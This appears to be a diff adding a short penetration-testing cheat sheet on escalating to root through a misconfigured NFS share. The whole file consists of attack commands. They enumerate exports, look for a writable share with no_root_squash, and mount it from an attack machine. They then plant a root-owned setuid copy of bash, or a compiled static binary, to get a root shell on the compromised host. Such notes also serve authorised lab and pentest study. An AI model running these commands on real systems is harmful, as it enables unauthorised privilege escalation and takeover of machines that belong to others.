@@ -1,0 +1,19 @@
+### nfs ###
+
+## enum
+showmount -e $h								# on attack machine
+cat /etc/exports                                                        # search writable share with no_root_squash
+
+## mount
+mkdir /tmp/nfs								# on attack machine, create folder
+sudo mount -o rw $h:/tmp /tmp/nfs					# mount folder on remote nfs
+> cp /bin/bash /tmp							# pwned machine copy bash to tmp
+sudo chown root:root /tmp/nfs/bash					# set up rights
+sudo chmod +s /tmp/nfs/bash						# set up rights
+> /tmp/bash -p								# be root
+
+## alternate
+cd /tmp/nfs
+gcc nfs.c -o nfs -w -static
+sudo chown root:root nfs
+sudo chmod +s nfs
